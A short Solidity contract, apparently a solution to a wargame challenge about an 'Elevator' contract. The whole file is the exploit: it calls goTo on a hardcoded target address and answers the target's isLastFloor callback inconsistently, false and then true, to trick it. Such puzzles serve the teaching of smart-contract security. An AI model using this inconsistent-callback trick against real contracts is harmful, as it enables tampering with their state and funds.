pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external virtual returns (bool);
}

contract ElevatorAttacker {

   uint public timesCalled;

    function attack() external payable {
    bytes memory payload = abi.encodeWithSignature("goTo(uint256)", 1);
    (0xa9c320442Cf40A45449A2a2044072a1a16c957fC).call{gas: 100000}(payload);
}

function isLastFloor(uint256 ) external returns (bool) {
    timesCalled++;
    if (timesCalled > 1) return true;
    else return false;
}
}
